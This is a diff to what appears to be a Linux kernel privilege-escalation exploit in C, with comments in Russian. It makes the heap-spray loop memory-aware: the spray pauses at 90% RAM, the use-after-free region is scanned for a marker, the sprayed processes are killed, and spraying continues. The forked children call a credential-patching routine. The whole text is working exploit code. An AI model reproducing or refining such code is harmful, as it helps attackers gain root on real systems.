@@ -216,6 +216,29 @@ static spray_slot_t *spray_ctrl;
 static int spray_count = SPRAY_COUNT;
 static int spray_actual = 0;
 
+static double get_ram_usage_percentage(void)
+{
+    FILE *fp = fopen("/proc/meminfo", "r");
+    if (!fp)
+        return 0.0;
+
+    char line[256];
+    unsigned long total_kb = 0;
+    unsigned long avail_kb = 0;
+    while (fgets(line, sizeof(line), fp))
+    {
+        if (strncmp(line, "MemTotal:", 9) == 0)
+            sscanf(line + 9, "%lu", &total_kb);
+        else if (strncmp(line, "MemAvailable:", 13) == 0)
+            sscanf(line + 13, "%lu", &avail_kb);
+    }
+    fclose(fp);
+
+    if (total_kb == 0) return 0.0;
+    double usage = (double)(total_kb - avail_kb) / (double)total_kb * 100.0;
+    return usage;
+}
+
 static int check_memory_available(void)
 {
     FILE *fp = fopen("/proc/meminfo", "r");
@@ -2492,42 +2515,64 @@ restart:;
     int batch_size = 100;
     int total_sprayed = 0;
     int marker_found_global = 0;
-    pid_t spray_pids[100];
+    int current_batch_start = 0;
 
     while (total_sprayed < total_limit && !marker_found_global) {
-        fprintf(stderr, "\r    [*] Batch: %d - %d... ", total_sprayed, total_sprayed + batch_size);
+        double ram_usage = get_ram_usage_percentage();
+        fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        // Спреим пачку
-        for (int i = 0; i < batch_size; i++) {
-            pid_t pid = fork();
-            if (pid == 0) {
-                char proc_name[16];
-                snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
-                prctl(PR_SET_NAME, proc_name, 0, 0, 0);
-                prctl(PR_SET_PDEATHSIG, SIGKILL);
-                
-                // Чтобы task_struct не уснул слишком глубоко
-                while(1) { 
-                    if (gbuf[0] == 0xab) safe_cred_patch();
-                    usleep(100000); 
+        int reached_mem_limit = (ram_usage > 90.0);
+        
+        if (!reached_mem_limit) {
+            // Спреим пачку
+            for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
+                pid_t pid = fork();
+                if (pid == 0) {
+                    char proc_name[16];
+                    snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
+                    prctl(PR_SET_NAME, proc_name, 0, 0, 0);
+                    prctl(PR_SET_PDEATHSIG, SIGKILL);
+                    
+                    while(1) { 
+                        if (gbuf[0] == 0xab) safe_cred_patch();
+                        usleep(100000); 
+                    }
+                    exit(0);
                 }
-                exit(0);
+                if (pid > 0) {
+                    spray_ctrl[total_sprayed].pid = pid;
+                    spray_ctrl[total_sprayed].do_action = 0;
+                    total_sprayed++;
+                }
             }
-            spray_pids[i] = pid;
+            usleep(5000); // Краткая пауза
         }
 
-        usleep(10000); // Даем планировщику разместить структуры
-
-        // Сканируем UAF регион
-        int num_found = 0;
-        if (scan_uaf_for_nonzero_multi(fd, NULL, &num_found)) {
-            fprintf(stderr, "\n    [!!!] SUCCESS! Marker found in batch %d\n", total_sprayed);
-            marker_found_global = 1;
-            break; 
+        // Если достигли 90% памяти ИЛИ спрей закончен, запускаем сканирование
+        if (reached_mem_limit || total_sprayed >= total_limit) {
+            fprintf(stderr, "\n    [!] %s limit reached (RAM: %.1f%%). Starting scan...\n", 
+                    reached_mem_limit ? "Memory" : "Spray", ram_usage);
+            
+            int num_found = 0;
+            if (scan_uaf_for_nonzero_multi(fd, NULL, &num_found)) {
+                fprintf(stderr, "\n    [!!!] SUCCESS! Marker found at %d processes\n", total_sprayed);
+                marker_found_global = 1;
+                break; 
+            } else {
+                fprintf(stderr, "\n    [-] Marker not found. Cleaning up old sprays to free memory...\n");
+                // Убиваем все созданные процессы
+                for (int i = 0; i < total_sprayed; i++) {
+                    if (spray_ctrl[i].pid > 0) {
+                        kill(spray_ctrl[i].pid, SIGKILL);
+                        waitpid(spray_ctrl[i].pid, NULL, 0);
+                        spray_ctrl[i].pid = 0;
+                    }
+                }
+                fprintf(stderr, "    [+] Memory cleared. Continuing spray from %d...\n", total_sprayed);
+                // Продолжаем цикл, total_sprayed не сбрасываем, но память теперь свободна
+                usleep(1000000); // Ждем освобождения ресурсов системой
+            }
         }
-        
-        // В старой версии мы не убивали процессы сразу, а копили их
-        total_sprayed += batch_size;
     }
 
     if (!marker_found_global) {
